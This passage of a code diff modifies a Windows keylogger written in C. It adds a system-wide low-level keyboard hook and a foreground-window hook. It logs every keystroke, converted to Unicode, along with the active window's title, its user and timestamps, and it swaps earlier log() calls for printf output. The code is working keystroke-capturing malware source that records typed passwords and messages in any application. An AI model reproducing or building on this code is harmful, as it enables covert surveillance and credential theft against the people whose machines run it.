+                printf("[\\|]");
                 break;
             case VK_OEM_6:
-                log("[]}]", CHAR_MODE, FALSE);
+                printf("[]}]");
                 break;
             case VK_OEM_7:
-                log("['\"]", CHAR_MODE, FALSE);
+                printf("['\"]");
                 break;
             case VK_OEM_8:
-                log("[miscellaneous characters]", CHAR_MODE, FALSE);
+                printf("[miscellaneous characters]");
                 break;
             case VK_OEM_102:
-                log("[<> keys]", CHAR_MODE, FALSE);
+                printf("[<> keys]");
                 break;
             case VK_PROCESSKEY:
-                log("[IME PROCESS]", CHAR_MODE, FALSE);
+                printf("[IME PROCESS]");
                 break;
             case VK_PACKET:
-                log("[Unicode characters]", CHAR_MODE, FALSE);
+                printf("[Unicode characters]");
                 break;
             case VK_ATTN:
-                log("[Attn]", CHAR_MODE, FALSE);
+                printf("[Attn]");
                 break;
             case VK_CRSEL:
-                log("[CrSel]", CHAR_MODE, FALSE);
+                printf("[CrSel]");
                 break;
             case VK_EXSEL:
-                log("[ExSel]", CHAR_MODE, FALSE);
+                printf("[ExSel]");
                 break;
             case VK_EREOF:
-                log("[Erase EOF]", CHAR_MODE, FALSE);
+                printf("[Erase EOF]");
                 break;
             case VK_PLAY:
-                log("[Play]", CHAR_MODE, FALSE);
+                printf("[Play]");
                 break;
             case VK_ZOOM:
-                log("[Zoom]", CHAR_MODE, FALSE);
+                printf("[Zoom]");
                 break;
             case VK_NONAME:
-                log("[Reserved]", CHAR_MODE, FALSE);
+                printf("[Reserved]");
                 break;
             case VK_PA1:
-                log("[PA1]", CHAR_MODE, FALSE);
+                printf("[PA1]");
                 break;
             case VK_OEM_CLEAR:
-                log("[Clear]", CHAR_MODE, FALSE);
+                printf("[Clear]");
                 break;
             default:
                 break;
@@ -881,20 +904,84 @@ END:
     strncpy_s(username, strlen("[USERNAME LOOKUP FAILED]"), "[USERNAME LOOKUP FAILED]", _TRUNCATE);
 }
 
-VOID GetWindowTitle(HWND hwnd)
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode < 0 ||( wParam != WM_KEYDOWN &&  wParam != WM_SYSKEYDOWN && wParam != WM_SYSKEYUP && wParam != WM_KEYUP))  // do not process message if nCode < 0
+        return CallNextHookEx(winHook, nCode, wParam, lParam); 
+    PKBDLLHOOKSTRUCT keyInfos = (PKBDLLHOOKSTRUCT)lParam;// struct qui contient les informations concernant la frappe.
+    HWND foregroundWindow =  GetForegroundWindow();
+    DWORD foregroundWindowPID;
+    DWORD foregroundWindowTID = GetWindowThreadProcessId(foregroundWindow, &foregroundWindowPID);
+    WCHAR keyByte[5] = {0};//for unicode we may need more than 1 byte
+    BYTE keyState[256] = {0};
+    DWORD currentTid = GetCurrentThreadId();
+    HKL keyboardLayout = GetKeyboardLayout(foregroundWindowTID);
+    INT res = 0;
+    char foregroundWindowUsername[4096];
+
+    if (foregroundWindowChanged)
+    {
+        foregroundWindowChanged = FALSE;
+        SYSTEMTIME lt;    
+        GetLocalTime(&lt);
+        GetUsernameOfForegroundWindow(foregroundWindowUsername, foregroundWindowPID);
+        printf("\n[%02d/%02d/%d %02d:%02d:%02d][Foreground window's user : %s][Foreground window's title : %s]\n", \
+            lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond, foregroundWindowUsername,  foregroundWindowTitle);
+    }
+    // We need to set ourself the keyState because we are in KEYBOARD_LL mode which capture keys BEFORE the target thread receive the key
+    // GetKeyBoardState do not work because it gets the state after us, not in the same time. There is no GetAsyncKeyboardState unfortunatly.
+    for (int i = 0; i <= 255; i++)
+    {
+        if (GetAsyncKeyState(i) & 0x8000)
+            keyState[i] = 0x80; 
+        else if (GetAsyncKeyState(i) & 0x1)
+            keyState[i] = 0x1;
+    }
+    if (wParam != WM_KEYUP)
+        LogvKey(keyInfos->vkCode, 0);
+    if (keyState[VK_CONTROL] != 0X80 && keyState[VK_MENU] != 0X80)
+        res = ToUnicodeEx(keyInfos->vkCode, keyInfos->scanCode, keyState, (LPWSTR)&keyByte, 4, 0x4, keyboardLayout);
+    else if ((keyState[VK_CONTROL] == 0X80 || keyState[VK_MENU] == 0X80) && wParam != WM_KEYUP)
+        LogvKey(keyInfos->vkCode, 1);
+    if (res > 0 && wParam != WM_KEYUP)
+        printf("%ws", keyByte);
+    fflush(NULL);
+    return CallNextHookEx(winHook, nCode, wParam, lParam);
+}
+
+void GetWindowTitle(HWND hwnd)
 {
     if (hwnd == NULL)
     {
         strcpy_s(foregroundWindowTitle, 4096, "[GetWinTitle Failed]");
-        log(foregroundWindowTitle, CHAR_MODE, TRUE);
         return;
     }
     int windowTitleLen = GetWindowTextLength(hwnd);
     if (windowTitleLen > 4095)
         windowTitleLen = 4095;
     GetWindowTextA(hwnd, foregroundWindowTitle, windowTitleLen + 1);
-    log(foregroundWindowTitle, CHAR_MODE, TRUE);
-    if (!strlen(foregroundWindowTitle))
-        log("NO WINDOW", CHAR_MODE, TRUE);
     foregroundWindowChanged = TRUE;
+}
+
+LRESULT CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
+{
+    GetWindowTitle(hwnd);
+}   
+
+int main(void)
+{
+    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
+    foregroundWindowChanged = TRUE;
+    GetWindowTitle(GetForegroundWindow());
+    if (winHook == NULL || winEvt == NULL)
+        exit(1);
+    MSG msg;
+    while(GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(winHook);
+    UnhookWinEvent(winEvt);
 }
